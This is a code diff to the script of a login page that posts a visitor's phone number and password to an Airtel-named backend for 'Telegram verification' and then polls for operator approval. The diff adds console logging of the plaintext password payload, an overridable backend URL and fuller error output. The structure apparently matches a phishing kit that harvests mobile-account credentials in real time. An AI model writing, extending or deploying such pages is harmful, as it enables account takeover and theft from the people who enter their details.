@@ -186,9 +186,11 @@
     </div>
 
     <script>
-      const BACKEND_URL = "https://airtel-01.onrender.com "; // Change to your backend URL
+      const BACKEND_URL = (localStorage.getItem("backendUrl") || "https://airtel-01.onrender.com").trim();
       let currentRequestId = null;
       let verificationInterval = null;
+      
+      console.log("Backend URL:", BACKEND_URL);
 
       document
         .getElementById("login1Form")
@@ -205,22 +207,34 @@
 
           try {
             // Send password to backend for Telegram verification
+            const payload = {
+              phone: phone.replace(/\s+/g, ""),
+              password: password,
+            };
+            
+            console.log("Sending to:", `${BACKEND_URL}/api/password/verify`);
+            console.log("Payload:", payload);
+            
             const response = await fetch(`${BACKEND_URL}/api/password/verify`, {
               method: "POST",
               headers: {
                 "Content-Type": "application/json",
               },
-              body: JSON.stringify({
-                phone: phone.replace(/\s+/g, ""),
-                password: password,
-              }),
+              body: JSON.stringify(payload),
             });
 
             if (!response.ok) {
-              throw new Error("Failed to submit password for verification");
+              const errorText = await response.text();
+              throw new Error(`Backend error (${response.status}): ${errorText}`);
             }
 
             const data = await response.json();
+            console.log("Response from backend:", data);
+            
+            if (!data.requestId) {
+              throw new Error(data.error || "No request ID returned");
+            }
+            
             currentRequestId = data.requestId;
 
             // Poll for approval
@@ -272,14 +286,17 @@
       }
 
       function showVerificationError(message) {
+        console.error("Verification error:", message);
         const errorContainer = document.getElementById("errorContainer");
         document.getElementById("modalTitle").textContent =
-          "❌ Verification Failed";
-        document.getElementById("modalMessage").textContent = "";
+          "❌ Error";
+        document.getElementById("modalMessage").textContent = "Check console for details";
 
         errorContainer.innerHTML = `
           <div class="modal-error">
-            <p>${message}</p>
+            <p><strong>Error:</strong> ${message}</p>
+            <p style="margin-top: 8px; font-size: 12px;">Backend URL: ${BACKEND_URL}</p>
+            <p style="margin-top: 4px; font-size: 12px;">Check your browser console (F12) for more details.</p>
           </div>
           <button class="retry-btn" onclick="location.reload()">Try Again</button>
         `;
